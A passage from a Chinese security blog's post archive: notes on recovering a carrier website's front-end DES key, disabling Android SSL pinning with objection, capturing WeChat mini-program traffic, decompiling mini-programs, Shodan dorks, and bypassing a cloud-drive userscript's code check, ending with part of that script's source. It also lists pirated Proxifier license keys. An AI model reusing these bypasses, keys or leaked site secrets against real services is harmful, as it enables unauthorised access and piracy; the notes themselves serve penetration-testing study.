未完待续","categories":[],"tags":[{"name":"加密","slug":"加密","permalink":"https://blog.njcit.me/tags/%E5%8A%A0%E5%AF%86/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://blog.njcit.me/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}]},{"title":"记一次测试前端加密的过程","slug":"渗透记录/记一次测试前端加密的过程","date":"2023-01-09T08:32:20.000Z","updated":"2023-06-21T02:26:44.149Z","comments":true,"path":"2023/01/09/渗透记录/记一次测试前端加密的过程/","link":"","permalink":"https://blog.njcit.me/2023/01/09/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%9A%84%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言 在对某电信运营商网站的测试过程中，发现传输的数据包全部加密如下： 于是开始寻找加密的方法以及相关密钥。 过程 通过查看js文件，发现网站疑似采用des加密，如下图： 可以得知des加密的key是：HHRENPTDXXDDESCRPYCODEKEY，加密的mode和padding分别是ECB和Pkcs7，同时发现自带了一个解密函数，尝试在console调用一下试试： 发现报错，这里小小的怀疑了一下加密方法是不是des，通过下断点调试发现确实是调用了上面的加密函数encryptByDES，带我定睛一看，我好像看到了base64,明明加密结果是以hex的形式输出的啊，改为hex之后果然能正常调用并输出结果： 另外可以看到上图的密钥只有之前密钥的前8位，因为des最大支持的密钥长度就是8位，所以后面的去掉也无所谓： 参考链接 https://the-x.cn/cryptography/Des.aspx https://www.cnblogs.com/idreamo/p/9333753.html","categories":[],"tags":[{"name":"加密","slug":"加密","permalink":"https://blog.njcit.me/tags/%E5%8A%A0%E5%AF%86/"},{"name":"前端","slug":"前端","permalink":"https://blog.njcit.me/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Android_app抓包","slug":"Android/android-app抓包","date":"2023-01-09T06:44:19.000Z","updated":"2023-01-09T07:14:17.179Z","comments":true,"path":"2023/01/09/Android/android-app抓包/","link":"","permalink":"https://blog.njcit.me/2023/01/09/Android/android-app%E6%8A%93%E5%8C%85/","excerpt":"","text":"前言 在Android 7.0之后，app默认就不信任用户安装的证书。有如下几种解决方案： 安装burpsuite证书到系统证书中，可以使用magisk模块。参考1https://github.com/qxqzx3489/magisk_install_burpCA,参考2https://github.com/Magisk-Modules-Repo/movecert 使用xpoesd模块,参考https://github.com/5up3rc/JustTrustMe,https://github.com/AndroidAppSec/resources/tree/master/%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/xposed 修改app文件，见参考链接 使用frida hookcheckServerTrusted frida 命令 建议用python3.9 12objection -g 天翼生活 exploreandroid sslpinning disable 参考文章 https://zhuanlan.zhihu.com/p/454356245 https://www.anquanke.com/post/id/197657","categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.njcit.me/tags/Android/"},{"name":"抓包","slug":"抓包","permalink":"https://blog.njcit.me/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"Windows微信小程序和微信浏览器抓包","slug":"渗透记录/Windows微信小程序和微信浏览器抓包","date":"2023-01-09T01:41:26.000Z","updated":"2023-06-21T02:26:44.201Z","comments":true,"path":"2023/01/09/渗透记录/Windows微信小程序和微信浏览器抓包/","link":"","permalink":"https://blog.njcit.me/2023/01/09/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/Windows%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%92%8C%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8A%93%E5%8C%85/","excerpt":"","text":"所需工具 proxifier：https://www.proxifier.com/ burpsuite：https://portswigger.net/burp/releases proxifier注册码 123L6Z8A-XY2J4-BTZ3P-ZZ7DF-A2Q9C（Portable Edition）5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition）P427L-9Y552-5433E-8DSR3-58Z68（MAC） proxifier 策略 让WeChatAppEx.exe和WechatBrowser.exe走burpsuite的代理即可。 成功截图 2023/05/24 测试依旧可以用","categories":[],"tags":[{"name":"抓包","slug":"抓包","permalink":"https://blog.njcit.me/tags/%E6%8A%93%E5%8C%85/"},{"name":"小程序","slug":"小程序","permalink":"https://blog.njcit.me/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}]},{"title":"Windows小程序反编译","slug":"渗透记录/Windows小程序反编译","date":"2023-01-06T07:13:19.000Z","updated":"2023-06-22T13:30:46.667Z","comments":true,"path":"2023/01/06/渗透记录/Windows小程序反编译/","link":"","permalink":"https://blog.njcit.me/2023/01/06/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/Windows%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/","excerpt":"","text":"2023/05/24 update 可以使用https://github.com/r3x5ur/unveilr一键反编译,编译命令，遇到问题可以看issue（开发者跑路了）备份https://github.com/D2550/A403.github.io/releases/download/tools/unveilr.zip： node scripts\\pkg.js 12345ls release/node scripts/pkg.jsyarn run buildyarn add --dev @rollup/plugin-jsonsudo npm i -g corepack 以下为老文章 前言 Windows小程序是加密存储，没办法直接反编译（解包），需要先解密，然后再反编译，这篇文章主要介绍如何在Windows上不依赖手机和root来获取小程序的源码。 所需工具 PC微信小程序包解密工具:https://share.weiyun.com/uMqNGOXv 反编译（解包）工具:https://pan.baidu.com/s/1dg5SdCv_VgzYVeakALgyVg?pwd=rd4h（丢，收费了） .net 版本：https://github.com/D2550/A403.github.io/releases/download/tools/WxappUnpack.7z 工具包：https://pan.baidu.com/s/1Az--jmLIuN2YOkK03AsBCw?pwd=1111（东西全） Node.js: https://nodejs.org/en/ 过程记录 首先获取小程序包，如果你没修改过微信文件的存储位置，那么默认在C:Files。里面会有一堆wx开头的文件夹，有两种方法确认哪个是你要找的小程序所在的文件夹：一是根据时间来判断，二是把所有文件夹都删除，重新打开小程序生成的文件夹就是。 我这里的文件路径是D:Files9d6ad7b7a62a74a\\862 使用第一个工具解密，不要把文件复制出来 解密成功的文件 安装Node.Js这里就不多说了，一路next基本就没问题。安装反编译的依赖: 123456 npm install esprima npm install css-tree npm install cssbeautify npm install vm2 npm install uglify-es npm install js-beautify 反编译： 121.主包反编node wuWxapkg.js xxx ## xxx为主包的路径## 2.子包反编node wuWxapkg.js xxx1 -s= xxx2 ## xxx1为子包的文件路径，xxx2为反编主包生成的文件路径 参考链接 https://www.cnblogs.com/Megasu/p/16501435.html 微信小程序开发者工具：https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html https://www.52pojie.cn/thread-1336730-1-1.html","categories":[],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://blog.njcit.me/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"反编译","slug":"反编译","permalink":"https://blog.njcit.me/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"}]},{"title":"Linux硬盘踩坑记","slug":"杂项/Linux硬盘踩坑记","date":"2023-01-06T01:59:45.000Z","updated":"2023-06-21T02:26:44.149Z","comments":true,"path":"2023/01/06/杂项/Linux硬盘踩坑记/","link":"","permalink":"https://blog.njcit.me/2023/01/06/%E6%9D%82%E9%A1%B9/Linux%E7%A1%AC%E7%9B%98%E8%B8%A9%E5%9D%91%E8%AE%B0/","excerpt":"","text":"背景介绍 800多买了块14T的矿渣硬盘，挂在Kali Linux（实体机，非虚拟机）下面用来备份一些不怎么重要的数据。之前由于机箱电源键坏了带走了我一块3T的硬盘，电源键老化按下去弹不起来导致系统一直在强制重启，然后硬盘就挂了。挂了之前我实在/etc/fstab中实现的硬盘开机自挂载，然后就开不了机，只能重新接上显示器开机在菜单页面按e修改启动参数，进入类似维护模式的终端，去除相关条目才能开机。同事告诉我可以使用修改 /etc/rc.local来实现开机自动挂载，但是我改了没生效，可能是我改错了或者啥的，正好发现如下的坑。 症状 在我修改完/etc/rc.local重启之后准备查看是否生效的时候，发现了硬盘设备名发生了变化，如下：重启前 很明显我14TB硬盘的设备名是sdb,重启后如下： 很明显sdb已经不是之前的14T的硬盘了，再次重启查看如下： 为啥截图使用的工具不一样呢。很明显我又不是在写教程，只是使用过程中发现的问题，只能使用之前命令过程中能作为证据的部分。 寻找原因 个人猜测可能和硬盘的上电顺序有关，也可能和硬盘安装的sata口有关，通过一番搜索，找到这篇文章：https://www.mayanpeng.cn/archives/184.html，也部分验证了自己的猜想。 解决自动挂在的问题 还是要使用/etc/fstab这个文件，只能祈祷硬盘活的久一点，但是我发现某个分区只有PARTUUID，没有UUID如下： 当然/etc/fstab也是支持PARTUUID，问题不大，但是使用mount -a挂在报错如下： 12UUID=3e012233-b5b5-4644-880c-0a7feea73007 /mnt/hdd ext4 defaults 0 0PARTUUID=318fa74d-3808-f049-9962-ca4002525e29 /mnt/14T ext4 defaults 0 0 搜索得到是分区没有格式化，格式化再次挂载成功。查看也发现有了UUID。 重启之后也正常 参考文章 https://www.mayanpeng.cn/archives/184.html https://www.cnblogs.com/will-xz/p/13532578.html https://www.jianshu.com/p/336758411dbf","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.njcit.me/tags/Linux/"},{"name":"分区","slug":"分区","permalink":"https://blog.njcit.me/tags/%E5%88%86%E5%8C%BA/"}]},{"title":"Android逆向工具","slug":"Android/Android逆向工具","date":"2023-01-04T06:22:47.000Z","updated":"2023-02-02T06:09:00.685Z","comments":true,"path":"2023/01/04/Android/Android逆向工具/","link":"","permalink":"https://blog.njcit.me/2023/01/04/Android/Android%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/","excerpt":"","text":"前言 工欲善其事，必先利其器，一款好的工具可以加快你工作的进度，记录一下常用或以后可能会遇到的工具。 工具 jadx:https://github.com/skylot/jadx/releases/tag/v1.4.5 JD-GUI:http://java-decompiler.github.io/ JEB:https://down.52pojie.cn/Tools/Android_Tools/JEB_demo_4.20.0.202210051834_by_CXV.zip 其他52破解提供的工具可以访问这个：https://down.52pojie.cn/Tools/Android_Tools lamda（提供一个web控制手机）：https://github.com/rev1si0n/lamda scrcpy（使用adb控制手机）:https://github.com/Genymobile/scrcpy MT管理器：https://mt2.cn/ frida工具的缝合怪：https://github.com/dqzg12300/fridaUiTools 结语 我好菜啊，大家都好强啊，呜呜呜。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://blog.njcit.me/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"shodan基础使用","slug":"网络空间搜索/shodan基础使用","date":"2023-01-04T01:11:50.000Z","updated":"2023-01-05T00:39:38.816Z","comments":true,"path":"2023/01/04/网络空间搜索/shodan基础使用/","link":"","permalink":"https://blog.njcit.me/2023/01/04/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/","excerpt":"","text":"简介 shodan是一款网络空间搜索引擎，地址https://www.shodan.io/。 使用 搜索列目录漏洞：http.title:\"Index of /\" country:\"CN\" 搜索某个IP地址：net:8.8.0.0/16 或者net:114.114.114.114 搜索域名/主机名：hostname:baidu.com 搜索指定端口：port:80 搜索指定软件：product:\"Apache httpd\" 搜索网页返回内容：http.html:\"hello world\" 参考链接 https://www.jianshu.com/p/0c184915c118 https://www.cnblogs.com/nul1/p/11341376.html","categories":[],"tags":[{"name":"shodan","slug":"shodan","permalink":"https://blog.njcit.me/tags/shodan/"}]},{"title":"网盘直链下载助手绕过关注公众号限制","slug":"杂项/网盘直链下载助手绕过关注公众号限制","date":"2022-12-29T08:12:24.000Z","updated":"2023-06-21T02:26:44.241Z","comments":true,"path":"2022/12/29/杂项/网盘直链下载助手绕过关注公众号限制/","link":"","permalink":"https://blog.njcit.me/2022/12/29/%E6%9D%82%E9%A1%B9/%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B%E7%BB%95%E8%BF%87%E5%85%B3%E6%B3%A8%E5%85%AC%E4%BC%97%E5%8F%B7%E9%99%90%E5%88%B6/","excerpt":"","text":"脚本下载 地址：https://greasyfork.org/zh-CN/scripts/436446-%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B 分析 抓包没看到数据包，推测本地验证，通过f12和查看源代码，确定是前端验证，添加一行代码，随便输入啥点击确定，控制台就会输出正确的验证码。console.log(pan.num) 貌似greasyfork不稳定，丢一下备用链接,另外发现可以用ce修改器的变速功能修改百度网盘客户端实现加速，emmm 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141114211431144114511461147114811491150115111521153115411551156115711581159116011611162116311641165116611671168116911701171117211731174117511761177117811791180118111821183118411851186118711881189119011911192119311941195119611971198119912001201120212031204120512061207120812091210121112121213121412151216121712181219122012211222122312241225122612271228122912301231123212331234123512361237123812391240124112421243124412451246124712481249125012511252125312541255125612571258125912601261126212631264126512661267126812691270127112721273127412751276127712781279128012811282128312841285128612871288128912901291129212931294129512961297129812991300130113021303130413051306130713081309131013111312131313141315131613171318131913201321132213231324132513261327132813291330133113321333133413351336133713381339134013411342134313441345134613471348134913501351135213531354135513561357135813591360136113621363136413651366136713681369137013711372137313741375137613771378137913801381138213831384138513861387138813891390139113921393139413951396139713981399140014011402140314041405140614071408140914101411141214131414141514161417141814191420142114221423142414251426142714281429143014311432143314341435143614371438143914401441144214431444144514461447144814491450145114521453145414551456145714581459146014611462146314641465146614671468146914701471147214731474147514761477147814791480148114821483148414851486148714881489149014911492149314941495149614971498149915001501150215031504150515061507150815091510151115121513151415151516151715181519152015211522152315241525152615271528152915301531153215331534153515361537153815391540154115421543154415451546154715481549155015511552155315541555155615571558155915601561156215631564156515661567156815691570157115721573157415751576157715781579158015811582158315841585158615871588158915901591159215931594159515961597159815991600160116021603160416051606160716081609161016111612161316141615161616171618161916201621162216231624162516261627162816291630163116321633163416351636163716381639164016411642164316441645164616471648164916501651165216531654165516561657165816591660166116621663166416651666166716681669167016711672167316741675167616771678167916801681168216831684168516861687168816891690169116921693169416951696169716981699170017011702170317041705170617071708170917101711171217131714171517161717171817191720172117221723172417251726172717281729173017311732173317341735173617371738173917401741174217431744174517461747174817491750175117521753175417551756175717581759176017611762176317641765176617671768176917701771177217731774177517761777177817791780178117821783178417851786178717881789179017911792179317941795179617971798179918001801180218031804180518061807180818091810181118121813181418151816181718181819182018211822182318241825182618271828182918301831183218331834183518361837183818391840184118421843184418451846184718481849185018511852185318541855185618571858185918601861186218631864186518661867186818691870187118721873187418751876187718781879188018811882188318841885188618871888188918901891189218931894189518961897189818991900190119021903190419051906190719081909191019111912191319141915191619171918191919201921192219231924192519261927192819291930193119321933193419351936193719381939194019411942194319441945194619471948194919501951195219531954195519561957195819591960196119621963196419651966196719681969197019711972197319741975197619771978197919801981198219831984198519861987198819891990199119921993199419951996199719981999200020012002200320042005200620072008200920102011201220132014201520162017201820192020202120222023202420252026202720282029203020312032203320342035203620372038203920402041204220432044204520462047204820492050205120522053205420552056205720582059206020612062206320642065206620672068206920702071207220732074207520762077207820792080208120822083208420852086208720882089209020912092209320942095209620972098209921002101210221032104210521062107210821092110211121122113211421152116211721182119212021212122212321242125212621272128212921302131213221332134213521362137213821392140214121422143214421452146214721482149215021512152215321542155215621572158215921602161216221632164216521662167216821692170217121722173217421752176217721782179218021812182218321842185218621872188218921902191219221932194219521962197219821992200220122022203220422052206220722082209221022112212221322142215221622172218221922202221222222232224222522262227222822292230223122322233223422352236223722382239224022412242224322442245224622472248224922502251225222532254225522562257225822592260226122622263226422652266226722682269227022712272227322742275227622772278227922802281228222832284228522862287228822892290229122922293229422952296229722982299230023012302230323042305230623072308230923102311231223132314231523162317231823192320232123222323232423252326232723282329233023312332233323342335233623372338233923402341234223432344234523462347234823492350235123522353235423552356235723582359236023612362236323642365236623672368236923702371237223732374237523762377237823792380238123822383238423852386238723882389239023912392239323942395239623972398239924002401240224032404240524062407240824092410241124122413241424152416241724182419242024212422242324242425242624272428242924302431243224332434243524362437243824392440244124422443244424452446244724482449245024512452245324542455245624572458245924602461246224632464246524662467246824692470247124722473247424752476247724782479248024812482248324842485248624872488248924902491249224932494249524962497249824992500250125022503250425052506250725082509251025112512251325142515251625172518251925202521252225232524252525262527252825292530253125322533253425352536253725382539254025412542254325442545254625472548254925502551255225532554255525562557255825592560256125622563256425652566256725682569257025712572257325742575257625772578257925802581258225832584258525862587258825892590259125922593259425952596259725982599260026012602260326042605260626072608260926102611261226132614261526162617261826192620262126222623262426252626262726282629263026312632263326342635263626372638263926402641264226432644264526462647264826492650265126522653265426552656265726582659266026612662266326642665266626672668266926702671267226732674267526762677267826792680268126822683268426852686268726882689269026912692269326942695269626972698269927002701270227032704270527062707270827092710271127122713271427152716271727182719272027212722272327242725272627272728272927302731273227332734273527362737273827392740274127422743274427452746274727482749275027512752275327542755275627572758275927602761276227632764276527662767276827692770277127722773277427752776277727782779278027812782278327842785278627872788278927902791279227932794279527962797279827992800280128022803280428052806280728082809281028112812// ==UserScript==// @name 网盘直链下载助手// @namespace https://github.com/syhyz1990/baiduyun// @version 6.0.3// @author GreasyFork// @description 👆👆👆👆👆👆👆 - 支持批量获取 ✅百度网盘 ✅阿里云盘 ✅天翼云盘 ✅迅雷云盘 ✅夸克网盘 ✅移动云盘 六大网盘的直链下载地址，配合 IDM，Xdown，Aria2，Curl，比特彗星等工具高效🚀🚀🚀下载，完美适配 Chrome，Edge，FireFox，360，QQ，搜狗，百分，遨游，星愿，Opera，猎豹，Vivaldi，Yandex，Kiwi 等 18 种浏览器。可在无法安装客户端的环境下使用，助手免费开源。😎// @license AGPL-3.0-or-later// @homepage https://www.youxiaohou.com/install.html// @supportURL https://github.com/syhyz1990/baiduyun// @antifeature membership// @match *://pan.baidu.com/disk/home*// @match *://yun.baidu.com/disk/home*// @match *://pan.baidu.com/disk/main*// @match *://yun.baidu.com/disk/main*// @match *://pan.baidu.com/s/*// @match *://yun.baidu.com/s/*// @match *://pan.baidu.com/share/*// @match *://yun.baidu.com/share/*// @match *://www.aliyundrive.com/s/*// @match *://www.aliyundrive.com/drive*// @match *://cloud.189.cn/web/*// @match *://pan.xunlei.com/*// @match *://pan.quark.cn/*// @match *://yun.139.com/*// @match *://caiyun.139.com/*// @require https://unpkg.com/jquery@3.6.0/dist/jquery.min.js// @require https://unpkg.com/sweetalert2@10.16.6/dist/sweetalert2.all.min.js// @require https://unpkg.com/js-md5@0.7.3/build/md5.min.js// @connect baidu.com// @connect baidupcs.com// @connect aliyundrive.com// @connect 189.cn// @connect xunlei.com// @connect quark.cn// @connect youxiaohou.com// @connect yun.139.com// @connect caiyun.139.com// @connect localhost// @connect *// @run-at document-idle// @grant unsafeWindow// @grant GM_xmlhttpRequest// @grant GM_setClipboard// @grant GM_setValue// @grant GM_getValue// @grant GM_openInTab// @grant GM_info// @grant GM_registerMenuCommand// @grant GM_cookie// @icon data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjggMTI4Ij48cGF0aCBkPSJNMTAzLjYgMTA3LjRjMy41LTIuMiA4LjktNi4xIDEzLjgtMTIuNXM3LjMtMTIuNSA4LjUtMTYuNWMuNS0xLjcgMi4yLTcuNSAyLjItMTQuNyAwLTEwLjEtMy4zLTI1LjEtMTUuNC0zNi44LTE0LjUtMTQtMzIuMS0xNC4zLTM1LjctMTQuMy04IDAtMTUuNyAxLjktMjIuNiA1LjJDNDQgMjMgMzUuNyAzMS40IDMwLjggNDEuN2MtMS4zIDIuOC00IDQuNy03LjEgNS00IC4zLTcuNSA0LjQtOC45IDkuNi0uNSAxLjktMS42IDMuNS0zLjEgNC43QzQuNCA2Ni44IDAgNzUuNyAwIDg1YzAgNi44IDIuMyAxMy4xIDYuMSAxOC4yIDUuNSA3LjQgMTQuMiAxMi4yIDI0IDEyLjJoNDcuMWM0LjQgMCAxMS0uNSAxOC4zLTMuNSAzLjItMS40IDUuOS0zIDguMS00LjV6IiBmaWxsPSIjNDQ0Ii8+PHBhdGggZD0iTTExOS44IDY0LjNjLjEtMTcuMS0xMC40LTI4LTEyLjUtMzAuMUM5NSAyMi4xIDc5LjkgMjEuOCA3Ni45IDIxLjhjLTE3LjYgMC0zMy4zIDEwLjUtMzkuOSAyNi43LS42IDEuMy0xLjggMi4zLTMuNCAyLjNoLS40Yy01LjggMC0xMC42IDQuOC0xMC42IDEwLjd2LjVjMCAxLjQtLjggMi42LTEuOSAzLjNDMTMuNCA2OSA4LjggNzYuOCA4LjggODVjMCAxMi4yIDkuOSAyMi4zIDIyLjIgMjIuM2g0NS4yYzMuNi0uMSAxNy42LS45IDI5LjYtMTIgMi45LTIuOCAxMy45LTEzLjcgMTQtMzF6IiBmaWxsPSIjMTM5N2Q4Ii8+PHBhdGggZD0iTTExMC44IDU3LjRsLjIgMy4zYzAgMS4zLTEuMSAyLjQtMi4zIDIuNC0xLjMgMC0yLjMtMS4xLTIuMy0yLjRsLS4xLTIuOHYtLjNjMC0xLjIuOS0yLjIgMi4xLTIuM2guM2MuNyAwIDEuMy4zIDEuNy43LS4yLjEuMy41LjQgMS40em0tMy4zLTEwLjNjMCAxLjItMSAyLjMtMi4yIDIuM2gtLjFjLS44IDAtMS42LS41LTItMS4yLTQuNi04LjMtMTMuMy0xMy41LTIyLjgtMTMuNS0xLjIgMC0yLjMtMS0yLjMtMi4ydi0uMWMwLTEuMiAxLTIuMyAyLjItMi4zaC4xYTMwLjM3IDMwLjM3IDAgMCAxIDE1LjggNC40YzQuNiAyLjggOC40IDYuOCAxMS4xIDExLjUuMS4zLjIuNy4yIDEuMXpNODguMyA3My44TDczLjUgOTMuMmMtMS41IDEuOS0zLjUgMy4xLTUuNyAzLjVoLS4yYy0uNC4xLS44LjEtMS4yLjEtLjYgMC0xLjEtLjEtMS42LS4yLTIuMi0uNC00LjItMS43LTUuNi0zLjVMNDQuMyA3My45Yy0yLTIuNi0yLjUtNS40LTEuNC03LjcuMS0uMS4xLS4yLjItLjIgMS4yLTIgMy41LTMuMiA2LjQtMy4yaDYuNnYtNS43YzAtNi44IDQuNy0xMiAxMC45LTEyIDQuOCAwIDguNSAyLjYgMTAuMyA3LjIuNSAxLjMtLjIgMi43LTEuNSAzLjJzLTIuOC0uMS0zLjMtMS40Yy0xLjEtMi43LTIuOS00LTUuNS00LTMuNSAwLTYgMy02IDd2OC4xYzAgLjUtLjIgMS0uNiAxLjQtLjYuNy0xLjcgMS4xLTIuNiAxLjFoLTguNGMtMS4zIDAtMiAuNC0yLjEuNy0uMi40IDAgMS4zLjkgMi40TDYzLjEgOTBjLjkgMS4yIDIuMSAxLjggMy4zIDEuOHMyLjMtLjYgMy4xLTEuN2wxNC44LTE5LjNjLjktMS4xIDEuMS0yIC45LTIuNC0uMi0uMy0uOS0uNy0yLjEtLjdoLTcuNmMtLjkgMC0xLjctLjUtMi4xLTEuMi0uMy0uNC0uNC0uOC0uNC0xLjMgMC0xLjQgMS4xLTIuNSAyLjUtMi41aDcuNmMzLjEgMCA1LjUgMS4zIDYuNiAzLjVsLjMuN2MuNyAyLjEuMSA0LjYtMS43IDYuOXoiIGZpbGw9IiM0NDQiLz48L3N2Zz4=// ==/UserScript==(function () &#123; &#x27;use strict&#x27;; let pt = &#x27;&#x27;, selectList = [], params = &#123;&#125;, mode = &#x27;&#x27;, width = 800, pan = &#123;&#125;, color = &#x27;&#x27;, doc = $(document), progress = &#123;&#125;, request = &#123;&#125;, ins = &#123;&#125;, idm = &#123;&#125;; const scriptInfo = GM_info.script; const version = scriptInfo.version; const author = scriptInfo.author; const name = scriptInfo.name; const customClass = &#123; popup: &#x27;pl-popup&#x27;, header: &#x27;pl-header&#x27;, title: &#x27;pl-title&#x27;, closeButton: &#x27;pl-close&#x27;, content: &#x27;pl-content&#x27;, input: &#x27;pl-input&#x27;, footer: &#x27;pl-footer&#x27; &#125;; const terminalType = &#123; wc: &quot;Windows CMD&quot;, wp: &quot;Windows PowerShell&quot;, lt: &quot;Linux 终端&quot;, ls: &quot;Linux Shell&quot;, mt: &quot;MacOS 终端&quot;, &#125;; let toast = Swal.mixin(&#123; toast: true, position: &#x27;top&#x27;, showConfirmButton: false, timer: 3500, timerProgressBar: false, didOpen: (toast) =&gt; &#123; toast.addEventListener(&#x27;mouseenter&#x27;, Swal.stopTimer); toast.addEventListener(&#x27;mouseleave&#x27;, Swal.resumeTimer); &#125; &#125;); const message = &#123; success: (text) =&gt; &#123; toast.fire(&#123;title: text, icon: &#x27;success&#x27;&#125;); &#125;, error: (text) =&gt; &#123; toast.fire(&#123;title: text, icon: &#x27;error&#x27;&#125;); &#125;, warning: (text) =&gt; &#123; toast.fire(&#123;title: text, icon: &#x27;warning&#x27;&#125;); &#125;, info: (text) =&gt; &#123; toast.fire(&#123;title: text, icon: &#x27;info&#x27;&#125;); &#125;, question: (text) =&gt; &#123; toast.fire(&#123;title: text, icon: &#x27;question&#x27;&#125;); &#125; &#125;; let base = &#123; getCookie(name) &#123; let arr = document.cookie.replace(/\\s/g, &quot;&quot;).split(&#x27;;&#x27;); for (let i = 0, l = arr.length; i &lt; l; i++) &#123; let tempArr = arr[i].split(&#x27;=&#x27;); if (tempArr[0] === name) &#123; return decodeURIComponent(tempArr[1]); &#125; &#125; return &#x27;&#x27;; &#125;, isType(obj) &#123; return Object.prototype.toString.call(obj).replace(/^\\[object (.+)\\]$/, &#x27;$1&#x27;).toLowerCase(); &#125;, getValue(name) &#123; return GM_getValue(name); &#125;, setValue(name, value) &#123; GM_setValue(name, value); &#125;, getStorage(key) &#123; try &#123; return JSON.parse(localStorage.getItem(key)); &#125; catch (e) &#123; return localStorage.getItem(key); &#125; &#125;, setStorage(key, value) &#123; if (this.isType(value) === &#x27;object&#x27; || this.isType(value) === &#x27;array&#x27;) &#123; return localStorage.setItem(key, JSON.stringify(value)); &#125; return localStorage.setItem(key, value); &#125;, setClipboard(text) &#123; GM_setClipboard(text, &#x27;text&#x27;); &#125;, e(str) &#123; return btoa(unescape(encodeURIComponent(str))); &#125;, d(str) &#123; return decodeURIComponent(escape(atob(str))); &#125;, getExtension(name) &#123; const reg = /(?!\\.)\\w+$/; if (reg.test(name)) &#123; let match = name.match(reg); return match[0].toUpperCase(); &#125; return &#x27;&#x27;; &#125;, sizeFormat(value) &#123; if (value === +value) &#123; let unit = [&quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot;, &quot;EB&quot;, &quot;ZB&quot;, &quot;YB&quot;]; let index = Math.floor(Math.log(value) / Math.log(1024)); let size = value / Math.pow(1024, index); size = size.toFixed(1); return size + unit[index]; &#125; return &#x27;&#x27;; &#125;, sortByName(arr) &#123; const handle = () =&gt; &#123; return (a, b) =&gt; &#123; const p1 = a.filename ? a.filename : a.server_filename; const p2 = b.filename ? b.filename : b.server_filename; return p1.localeCompare(p2, &quot;zh-CN&quot;); &#125;; &#125;; arr.sort(handle()); &#125;, fixFilename(name) &#123; return name.replace(/[!?&amp;|`&quot;&#x27;*\\/:&lt;&gt;\\\\]/g, &#x27;_&#x27;); &#125;, blobDownload(blob, filename) &#123; if (blob instanceof Blob) &#123; const url = URL.createObjectURL(blob); const a = document.createElement(&#x27;a&#x27;); a.href = url; a.download = filename; a.click(); 